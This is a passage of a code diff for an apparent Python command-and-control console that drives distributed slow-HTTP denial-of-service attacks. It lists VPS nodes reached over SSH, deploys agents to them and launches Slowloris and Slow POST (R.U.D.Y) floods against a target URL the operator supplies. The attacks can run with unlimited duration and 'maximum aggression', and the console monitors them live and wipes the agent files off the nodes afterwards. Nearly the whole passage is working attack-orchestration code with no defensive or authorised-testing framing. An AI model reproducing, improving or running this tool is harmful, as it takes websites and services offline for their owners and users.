+                        print(f"{Colors.GREEN}[SUCCESS] Command executed: {test_output.strip()}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[ERROR] Command failed: {test_output}{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[FAILED] Connection to {ip} failed: {message}{Colors.RESET}")
+                    self.db_manager.update_vps_status(ip, 'offline', False)
+            else:
+                print(f"{Colors.RED}[ERROR] Invalid VPS ID{Colors.RESET}")
+                
+        except ValueError:
+            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+        
+        input("\nPress Enter to continue...")
+    
+    def launch_attack_menu(self):
+        """Launch distributed attack menu"""
+        vps_list = self.db_manager.get_all_vps()
+        
+        if not vps_list:
+            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
+            print(f"{Colors.YELLOW}[ACTION] Please add VPS nodes first{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        # Get attack parameters
+        print(f"\n{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
+        print("=" * 40)
+        
+        try:
+            session_name = self.input_with_prompt("Session name: ")
+            if not session_name:
+                return
+            
+            target_url = self.input_with_prompt("Target URL: ")
+            if not target_url:
+                return
+            
+            # Select VPS nodes
+            print(f"\n{Colors.BOLD}SELECT VPS NODES{Colors.RESET}")
+            print("-" * 30)
+            
+            print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Agent':<8}")
+            print("-" * 60)
+            
+            for vps in vps_list:
+                status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
+                agent_color = Colors.GREEN if len(vps) > 10 and vps[10] else Colors.RED
+                agent_status = "YES" if len(vps) > 10 and vps[10] else "NO"
+                
+                print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {agent_color}{agent_status:<8}{Colors.RESET}")
+            
+            vps_selection = input(f"\n{Colors.CYAN}Enter VPS IDs (comma-separated, or 'all' for all): {Colors.RESET}").strip()
+            
+            if vps_selection.lower() == 'all':
+                selected_vps = [vps[1] for vps in vps_list]
+            else:
+                selected_ids = [int(id.strip()) for id in vps_selection.split(',')]
+                selected_vps = [vps[1] for vps in vps_list if vps[0] in selected_ids]
+            
+            if not selected_vps:
+                print(f"{Colors.RED}[ERROR] No VPS nodes selected{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Select attack type
+            print(f"\n{Colors.BOLD}SELECT ATTACK TYPE{Colors.RESET}")
+            print("-" * 30)
+            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris Attack (HTTP DoS)")
+            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST Attack (R.U.D.Y)")
+            
+            attack_choice = input(f"\n{Colors.CYAN}Select attack type (1-2): {Colors.RESET}").strip()
+            
+            if attack_choice == '1':
+                attack_type = 'slowloris'
+            elif attack_choice == '2':
+                attack_type = 'slow_post'
+            else:
+                print(f"{Colors.RED}[ERROR] Invalid selection{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Get attack parameters
+            print(f"\n{Colors.BOLD}ATTACK PARAMETERS{Colors.RESET}")
+            print("-" * 30)
+            
+            try:
+                connections = int(input(f"{Colors.CYAN}Connections per VPS (default 1000): {Colors.RESET}") or "1000")
+                delay = int(input(f"{Colors.CYAN}Delay between packets in seconds (default 15): {Colors.RESET}") or "15")
+                duration = int(input(f"{Colors.CYAN}Duration in seconds (0=unlimited, default 0): {Colors.RESET}") or "0")
+                
+                if connections < 1:
+                    print(f"{Colors.RED}[ERROR] Connections must be at least 1{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+                
+                if delay < 0:
+                    print(f"{Colors.RED}[ERROR] Delay cannot be negative{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+                
+            except ValueError:
+                print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Confirm launch
+            print(f"\n{Colors.BOLD}ATTACK SUMMARY{Colors.RESET}")
+            print("=" * 40)
+            print(f"Session: {session_name}")
+            print(f"Target: {target_url}")
+            print(f"Attack Type: {attack_type}")
+            print(f"VPS Nodes: {len(selected_vps)}")
+            print(f"Connections per VPS: {connections}")
+            print(f"Delay: {delay} seconds")
+            print(f"Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
+            
+            confirm = input(f"\n{Colors.YELLOW}Launch attack? (y/N): {Colors.RESET}").strip().lower()
+            
+            if confirm != 'y':
+                print(f"{Colors.YELLOW}[CANCELLED] Attack not launched{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Create session and launch attack
+            session_id = self.db_manager.create_attack_session(
+                session_name, target_url, "", attack_type, selected_vps, 
+                {'connections': connections, 'delay': delay, 'duration': duration}
+            )
+            
+            if session_id:
+                print(f"\n{Colors.GREEN}[SUCCESS] Attack session created (ID: {session_id}){Colors.RESET}")
+                
+                # Launch the attack
+                success = self.attack_manager.launch_attack(
+                    session_id, target_url, attack_type, selected_vps,
+                    {'connections': connections, 'delay': delay, 'duration': duration}
+                )
+                
+                if success:
+                    print(f"{Colors.GREEN}[SUCCESS] Attack launched successfully{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[ERROR] Attack launch failed{Colors.RESET}")
+                    # Update session status
+                    self.db_manager.update_session_status(session_id, 'failed')
+            else:
+                print(f"{Colors.RED}[ERROR] Failed to create attack session{Colors.RESET}")
+            
         except KeyboardInterrupt:
             print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
         except Exception as e:
@@ -1542,671 +1646,417 @@ class SlowHTTPTUI:
         
         input("Press Enter to continue...")
     
-    def launch_attack_menu(self):
-        self.clear_screen()
-        self.print_banner()
-        
-        vps_list = self.db_manager.get_all_vps()
-        online_vps = [vps for vps in vps_list if vps[5] == 'online']
-        
-        if not online_vps:
-            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
-            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
+    def monitor_attacks_menu(self):
+        """Monitor active attacks menu"""
+        if not self.attack_manager.active_attacks:
+            print(f"{Colors.YELLOW}[INFO] No active attacks{Colors.RESET}")
             input("Press Enter to continue...")
             return
         
-        print(f"{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
-        print("=" * 50)
+        print(f"\n{Colors.BOLD}MONITOR ACTIVE ATTACKS{Colors.RESET}")
+        print("=" * 40)
         
-        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
-        for i, vps in enumerate(online_vps, 1):
-            agent_status = "✓" if len(vps) > 10 and vps[10] else "✗"
-            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'}) [Agent: {agent_status}]")
-        
-        try:
-            # Target configuration
-            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
-            target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ")
-            if not target_url:
-                return
-            
-            # Parse and validate target
-            if not target_url.startswith(('http://', 'https://')):
-                target_url = 'http://' + target_url
-            
-            # Attack type selection
-            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
-            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (Keep connections open)")
-            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST (R.U.D.Y - Large uploads)")
-            
-            attack_choice = self.input_with_prompt("Select attack type (1-2): ")
-            attack_types = {'1': 'slowloris', '2': 'slow_post'}
-            attack_type = attack_types.get(attack_choice)
-            
-            if not attack_type:
-                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # VPS selection
-            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
-            vps_choice = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
-            
-            if vps_choice.lower() == 'y':
-                selected_vps = [vps[1] for vps in online_vps]
-            else:
-                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
-                selection = self.input_with_prompt("VPS selection: ")
-                if not selection:
-                    return
-                
-                try:
-                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
-                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
-                except (ValueError, IndexError):
-                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
-                    input("Press Enter to continue...")
-                    return
-            
-            if not selected_vps:
-                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # Attack parameters
-            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
-            
-            connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
-            try:
-                connections = int(connections_str)
-                if connections > 20000:
-                    print(f"{Colors.RED}WARNING: Very high connection count ({connections:,}){Colors.RESET}")
-                    print("This will create massive server load. Continue? (y/N)")
-                    if input().strip().lower() != 'y':
-                        connections = 1000
-            except ValueError:
-                connections = 100
-            
-            delay_str = self.input_with_prompt("Delay between packets (default 15): ", False) or "15"
-            try:
-                delay = int(delay_str)
-                if delay == 0:
-                    print(f"{Colors.RED}ZERO DELAY MODE: Maximum aggression enabled{Colors.RESET}")
-            except ValueError:
-                delay = 15
-            
-            duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False) or "0"
-            try:
-                duration = int(duration_str)
-            except ValueError:
-                duration = 0
-            
-            # Attack summary
-            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
-            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
-            attack_name = "Slowloris" if attack_type == "slowloris" else "Slow POST (R.U.D.Y)"
-            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
-            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
-            print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
-            print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
-            print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.RESET}")
-            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
-            
-            if attack_type == 'slow_post':
-                estimated_data = len(selected_vps) * connections * 50  # Avg 50MB per connection
-                print(f"Estimated Total Data: {Colors.RED}{estimated_data:,} MB{Colors.RESET}")
-            
-            # Final confirmation
-            print(f"\n{Colors.RED}LAUNCH ATTACK? (y/N): {Colors.RESET}", end="")
-            confirm = input().strip().lower()
-            
-            if confirm != 'y':
-                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # Create attack session
-            session_name = f"Attack_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
-            
-            parameters = {
-                'connections': connections,
-                'delay': delay,
-                'duration': duration
-            }
-            
-            session_id = self.db_manager.create_attack_session(
-                session_name, target_url, target_host, attack_type, selected_vps, parameters
-            )
-            
-            # Launch attack
-            success = self.attack_manager.launch_attack(
-                session_id, target_url, attack_type, selected_vps, parameters
-            )
-            
-            if success:
-                print(f"\n{Colors.GREEN}[SUCCESS] DISTRIBUTED ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
-                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
-                
-                # Auto-start monitoring
-                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
-                self.monitor_attack(session_id)
-            else:
-                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
-                input("Press Enter to continue...")
-                
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
-            input("Press Enter to continue...")
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-            input("Press Enter to continue...")
-    
-    def monitor_attack(self, session_id=None):
-        if session_id is None:
-            # List active attacks
-            if not self.attack_manager.active_attacks:
-                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
-            for sid, attack_info in self.attack_manager.active_attacks.items():
-                attack_name = "Slowloris" if attack_info['attack_type'] == "slowloris" else "Slow POST"
-                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
-            
-            try:
-                session_input = self.input_with_prompt("Enter session ID to monitor: ")
-                if not session_input or not session_input.isdigit():
-                    return
-                session_id = int(session_input)
-            except (ValueError, KeyboardInterrupt):
-                return
-        
-        if session_id not in self.attack_manager.active_attacks:
-            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time attack monitoring...{Colors.RESET}")
-        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
-        time.sleep(2)
-        
-        try:
-            while session_id in self.attack_manager.active_attacks:
-                status_data = self.attack_manager.get_attack_status(session_id)
-                attack_info = self.attack_manager.active_attacks[session_id]
-                
-                # Clear screen and display status
-                self.clear_screen()
-                
-                print(f"{Colors.BOLD}{'='*95}{Colors.RESET}")
-                print(f"{Colors.BOLD}{Colors.RED}           DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
-                print(f"{Colors.BOLD}{'='*95}{Colors.RESET}")
-                
-                attack_name = "SLOWLORIS" if attack_info.get('attack_type') == 'slowloris' else "SLOW POST (R.U.D.Y)"
-                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
-                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
-                
-                if attack_info.get('start_time'):
-                    uptime = datetime.now() - attack_info['start_time']
-                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
-                
-                # Parameters display
-                params = attack_info.get('parameters', {})
-                print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
-                
-                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
-                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'Resources':<20} {'Last Check'}")
-                print("-" * 100)
-                
-                total_processes = 0
-                active_vps = 0
-                
-                for vps_ip, data in status_data.items():
-                    processes = data.get('active_processes', 0)
-                    status = "ATTACKING" if processes > 0 else "IDLE"
-                    color = Colors.GREEN if processes > 0 else Colors.RED
-                    conn_info = data.get('connections_info', '')
-                    cpu_info = data.get('cpu_info', '')
-                    mem_info = data.get('memory_info', '')
-                    
-                    total_processes += processes
-                    if processes > 0:
-                        active_vps += 1
-                    
-                    resource_info = f"{cpu_info}{mem_info}".strip()
-                    
-                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {resource_info:<20} {datetime.now().strftime('%H:%M:%S')}")
-                
-                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
-                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
-                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
-                
-                est_connections = total_processes * params.get('connections', 100)
-                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
-                
-                if attack_info.get('attack_type') == 'slow_post':
-                    est_data_gb = (est_connections * 50) / 1024  # Estimated GB
-                    print(f"{Colors.RED}Estimated Data Transfer: {est_data_gb:.1f} GB{Colors.RESET}")
-                
-                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
-                
-                time.sleep(5)
-                
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
-            
-            # Ask if user wants to stop the attack
-            try:
-                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
-                if stop_attack == 'y':
-                    self.attack_manager.stop_attack(session_id)
-            except KeyboardInterrupt:
-                pass
-        
-        input("\nPress Enter to continue...")
-    
-    def attack_history_menu(self):
-        self.clear_screen()
-        self.print_banner()
-        
-        sessions = self.db_manager.get_attack_sessions()
-        
-        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
-        print("=" * 30)
-        
-        if not sessions:
-            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
-        else:
-            print(f"\n{'ID':<4} {'Session Name':<25} {'Target':<20} {'Type':<15} {'VPS':<4} {'Status':<10} {'Start Time'}")
-            print("-" * 110)
-            
-            for session in sessions:
-                start_time = session[6][:19] if session[6] else 'N/A'
-                status_color = Colors.GREEN if session[9] == 'completed' else Colors.YELLOW if session[9] == 'running' else Colors.RED
-                attack_type = "Slowloris" if session[4] == 'slowloris' else "Slow POST"
-                vps_count = len(json.loads(session[5])) if session[5] else 0
-                
-                print(f"{session[0]:<4} {session[1][:24]:<25} {session[3][:19]:<20} {attack_type:<15} {vps_count:<4} {status_color}{session[9]:<10}{Colors.RESET} {start_time}")
-        
-        # Show logs option
-        if sessions:
-            try:
-                session_input = input(f"\n{Colors.YELLOW}Enter session ID to view logs (Enter to skip): {Colors.RESET}").strip()
-                if session_input and session_input.isdigit():
-                    self.show_attack_logs(int(session_input))
-            except (ValueError, KeyboardInterrupt):
-                pass
-        
-        input("\nPress Enter to continue...")
-    
-    def show_attack_logs(self, session_id):
-        """Show detailed logs for a specific attack session"""
-        conn = self.db_manager.db_manager.db_file
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            SELECT timestamp, vps_ip, log_level, message 
-            FROM attack_logs 
-            WHERE session_id = ? 
-            ORDER BY timestamp DESC 
-            LIMIT 50
-        ''', (session_id,))
-        
-        logs = cursor.fetchall()
-        conn.close()
-        
-        if logs:
-            print(f"\n{Colors.BOLD}ATTACK LOGS (Session {session_id}):{Colors.RESET}")
-            print(f"{'Time':<20} {'VPS':<15} {'Level':<8} {'Message':<50}")
-            print("-" * 100)
-            
-            for log in logs:
-                timestamp, vps_ip, level, message = log
-                level_color = Colors.RED if level == 'ERROR' else Colors.YELLOW if level == 'WARNING' else Colors.GREEN
-                print(f"{timestamp[:19]:<20} {vps_ip or 'N/A':<15} {level_color}{level:<8}{Colors.RESET} {message[:50]}")
-        else:
-            print(f"{Colors.YELLOW}[INFO] No logs found for session {session_id}{Colors.RESET}")
-    
-    def system_status_menu(self):
-        self.clear_screen()
-        self.print_banner()
-        
-        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
-        print("=" * 20)
-        
-        # VPS Statistics
-        vps_list = self.db_manager.get_all_vps()
-        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
-        offline_count = len(vps_list) - online_count
-        agents_deployed = sum(1 for vps in vps_list if len(vps) > 10 and vps[10])
-        
-        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
-        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
-        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
-        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
-        print(f"Agents Deployed: {Colors.YELLOW}{agents_deployed}{Colors.RESET}")
-        
-        # Attack Statistics
-        sessions = self.db_manager.get_attack_sessions()
-        active_attacks = len(self.attack_manager.active_attacks)
-        running_sessions = sum(1 for s in sessions if s[9] == 'running')
-        
-        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
-        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
-        print(f"Running Sessions: {Colors.YELLOW}{running_sessions}{Colors.RESET}")
-        print(f"Active Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
-        
-        # SSH Connections
-        ssh_connections = len(self.ssh_manager.connections)
-        cached_credentials = len(self.ssh_manager.connection_cache)
-        
-        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
-        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
-        print(f"Cached Credentials: {Colors.CYAN}{cached_credentials}{Colors.RESET}")
-        
-        # System Information
-        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
-        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
-        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
-        print(f"Version: {Colors.GREEN}Complete Fixed Edition v3.0{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def advanced_options_menu(self):
-        while self.running:
+        while True:
             self.clear_screen()
             self.print_banner()
             
-            print(f"{Colors.BOLD}ADVANCED OPTIONS{Colors.RESET}")
-            print("=" * 20)
+            print(f"\n{Colors.BOLD}ACTIVE ATTACKS{Colors.RESET}")
+            print("-" * 40)
+            
+            for session_id, attack in self.attack_manager.active_attacks.items():
+                duration = (datetime.now() - attack['start_time']).seconds
+                duration_str = f"{duration//3600}h {(duration%3600)//60}m {duration%60}s"
+                
+                print(f"\n{Colors.CYAN}[SESSION {session_id}] {attack['session_name']}{Colors.RESET}")
+                print(f"  Target: {attack['target_url']}")
+                print(f"  Type: {attack['attack_type'].upper()}")
+                print(f"  Nodes: {len(attack['vps_list'])}")
+                print(f"  Duration: {duration_str}")
+                print(f"  Status: {attack['status']}")
+                
+                # Get status for each VPS
+                status = self.attack_manager.get_attack_status(session_id)
+                
+                for vps_ip in attack['vps_list']:
+                    if vps_ip in status:
+                        vps_status = status[vps_ip]
+                        process_color = Colors.GREEN if vps_status['active_processes'] > 0 else Colors.RED
+                        print(f"    {vps_ip}: {process_color}{vps_status['status']}{Colors.RESET} "
+                              f"{vps_status['connections_info']} {vps_status['cpu_info']} {vps_status['memory_info']}")
             
             menu = f"""
-{Colors.BOLD}ADVANCED FEATURES:{Colors.RESET}
-{Colors.GREEN}[1]{Colors.RESET} Bulk Operations
-{Colors.GREEN}[2]{Colors.RESET} Custom Attack Scripts
-{Colors.GREEN}[3]{Colors.RESET} Network Scanner
-{Colors.GREEN}[4]{Colors.RESET} Database Management
-{Colors.GREEN}[5]{Colors.RESET} Security Settings
+{Colors.BOLD}MONITORING OPTIONS:{Colors.RESET}
+{Colors.GREEN}[1]{Colors.RESET} Refresh Status
+{Colors.GREEN}[2]{Colors.RESET} Stop Attack
 {Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
 
-{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
+{Colors.YELLOW}Select option (0-2): {Colors.RESET}"""
             
             print(menu)
             choice = input().strip()
             
             if choice == '1':
-                self.bulk_operations_menu()
+                continue  # Just refresh the display
             elif choice == '2':
-                self.custom_scripts_menu()
-            elif choice == '3':
-                self.network_scanner_menu()
-            elif choice == '4':
-                self.database_management_menu()
-            elif choice == '5':
-                self.security_settings_menu()
+                self.stop_attack_menu()
             elif choice == '0':
                 break
             else:
                 print(f"{Colors.RED}Invalid option{Colors.RESET}")
                 time.sleep(1)
     
-    def bulk_operations_menu(self):
-        print(f"\n{Colors.BOLD}BULK OPERATIONS{Colors.RESET}")
-        print("-" * 20)
-        
-        print(f"{Colors.GREEN}[1]{Colors.RESET} Bulk Test All VPS")
-        print(f"{Colors.GREEN}[2]{Colors.RESET} Bulk Deploy Agents")
-        print(f"{Colors.GREEN}[3]{Colors.RESET} Bulk Stop All Attacks")
-        print(f"{Colors.GREEN}[4]{Colors.RESET} Bulk Clean Agents")
-        
-        choice = input(f"\n{Colors.YELLOW}Select operation: {Colors.RESET}").strip()
-        
-        if choice == '3':
-            self.bulk_stop_attacks()
-        elif choice == '4':
-            self.bulk_clean_agents()
-        else:
-            print(f"{Colors.YELLOW}Feature not implemented yet{Colors.RESET}")
-            input("Press Enter to continue...")
-    
-    def bulk_stop_attacks(self):
+    def stop_attack_menu(self):
+        """Stop attack menu"""
         if not self.attack_manager.active_attacks:
-            print(f"{Colors.YELLOW}[INFO] No active attacks to stop{Colors.RESET}")
+            print(f"{Colors.YELLOW}[INFO] No active attacks{Colors.RESET}")
             input("Press Enter to continue...")
             return
         
-        confirm = input(f"{Colors.RED}Stop ALL active attacks? (y/N): {Colors.RESET}").strip().lower()
-        if confirm != 'y':
-            return
+        print(f"\n{Colors.BOLD}STOP ATTACK{Colors.RESET}")
+        print("=" * 30)
         
-        print(f"\n{Colors.YELLOW}[BULK STOP] Stopping all active attacks...{Colors.RESET}")
-        
-        for session_id in list(self.attack_manager.active_attacks.keys()):
-            print(f"{Colors.CYAN}[STOPPING] Session {session_id}...{Colors.RESET}")
-            self.attack_manager.stop_attack(session_id)
-        
-        print(f"\n{Colors.GREEN}[SUCCESS] All attacks stopped{Colors.RESET}")
-        input("Press Enter to continue...")
-    
-    def bulk_clean_agents(self):
-        vps_list = self.db_manager.get_all_vps()
-        online_vps = [vps for vps in vps_list if vps[5] == 'online']
-        
-        if not online_vps:
-            print(f"{Colors.YELLOW}[INFO] No online VPS available{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        confirm = input(f"{Colors.RED}Clean agent files from all VPS? (y/N): {Colors.RESET}").strip().lower()
-        if confirm != 'y':
-            return
-        
-        print(f"\n{Colors.YELLOW}[BULK CLEAN] Cleaning agent files...{Colors.RESET}")
-        
-        success_count = 0
-        for vps in online_vps:
-            ip = vps[1]
-            print(f"{Colors.CYAN}[CLEANING] {ip}...{Colors.RESET} ", end="", flush=True)
-            
-            clean_cmd = "rm -rf /tmp/slowhttp_c2"
-            success, output = self.ssh_manager.execute_command(ip, clean_cmd)
-            
-            if success:
-                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
-                success_count += 1
-                self.db_manager.update_vps_status(ip, 'online', agent_deployed=False)
-            else:
-                print(f"{Colors.RED}FAILED{Colors.RESET}")
-        
-        print(f"\n{Colors.GREEN}[SUMMARY] Cleaned {success_count}/{len(online_vps)} VPS{Colors.RESET}")
-        input("Press Enter to continue...")
-    
-    def custom_scripts_menu(self):
-        print(f"\n{Colors.BOLD}CUSTOM ATTACK SCRIPTS{Colors.RESET}")
-        print("-" * 25)
-        print(f"{Colors.YELLOW}Feature disabled for security reasons{Colors.RESET}")
-        print(f"{Colors.CYAN}Consider using established frameworks like:{Colors.RESET}")
-        print(f"- OWASP ZAP for web security testing")
-        print(f"- Metasploit for penetration testing")
-        print(f"- Nmap for network scanning")
-        input("Press Enter to continue...")
-    
-    def network_scanner_menu(self):
-        print(f"\n{Colors.BOLD}NETWORK SCANNER{Colors.RESET}")
-        print("-" * 20)
-        print(f"{Colors.YELLOW}Basic network reconnaissance only{Colors.RESET}")
-        
-        target = input(f"{Colors.CYAN}Enter target IP/domain: {Colors.RESET}").strip()
-        if not target:
-            return
-        
-        print(f"\n{Colors.CYAN}[SCAN] Scanning {target}...{Colors.RESET}")
-        
-        # Basic port scan (educational purpose)
-        common_ports = [22, 80, 443, 8080]
-        for port in common_ports:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                result = sock.connect_ex((target, port))
-                if result == 0:
-                    print(f"{Colors.GREEN}Port {port}: Open{Colors.RESET}")
-                sock.close()
-            except:
-                pass
-        
-        input("\nPress Enter to continue...")
-    
-    def database_management_menu(self):
-        print(f"\n{Colors.BOLD}DATABASE MANAGEMENT{Colors.RESET}")
-        print("-" * 25)
-        
-        print(f"{Colors.GREEN}[1]{Colors.RESET} View Database Statistics")
-        print(f"{Colors.GREEN}[2]{Colors.RESET} Clean Old Sessions")
-        print(f"{Colors.GREEN}[3]{Colors.RESET} Export Data")
-        print(f"{Colors.GREEN}[4]{Colors.RESET} Backup Database")
-        
-        choice = input(f"\n{Colors.YELLOW}Select option: {Colors.RESET}").strip()
-        
-        if choice == '1':
-            self.show_database_stats()
-        elif choice == '2':
-            self.clean_old_sessions()
-        else:
-            print(f"{Colors.YELLOW}Feature not fully implemented{Colors.RESET}")
-            input("Press Enter to continue...")
-    
-    def show_database_stats(self):
-        print(f"\n{Colors.BOLD}DATABASE STATISTICS{Colors.RESET}")
-        print("-" * 25)
+        for session_id, attack in self.attack_manager.active_attacks.items():
+            print(f"\n{Colors.CYAN}[SESSION {session_id}] {attack['session_name']}{Colors.RESET}")
+            print(f"  Target: {attack['target_url']}")
+            print(f"  Type: {attack['attack_type'].upper()}")
+            print(f"  Nodes: {len(attack['vps_list'])}")
+            print(f"  Status: {attack['status']}")
         
         try:
+            choice = input(f"\n{Colors.CYAN}Enter session ID to stop (or 0 to cancel): {Colors.RESET}").strip()
+            
+            if choice == '0':
+                return
+            
+            session_id = int(choice)
+            
+            if session_id in self.attack_manager.active_attacks:
+                confirm = input(f"{Colors.YELLOW}Stop attack session {session_id}? (y/N): {Colors.RESET}").strip().lower()
+                
+                if confirm == 'y':
+                    success, message = self.attack_manager.stop_attack(session_id)
+                    
+                    if success:
+                        print(f"{Colors.GREEN}[SUCCESS] {message}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[ERROR] Failed to stop attack: {message}{Colors.RESET}")
+                else:
+                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}[ERROR] Invalid session ID{Colors.RESET}")
+                
+        except ValueError:
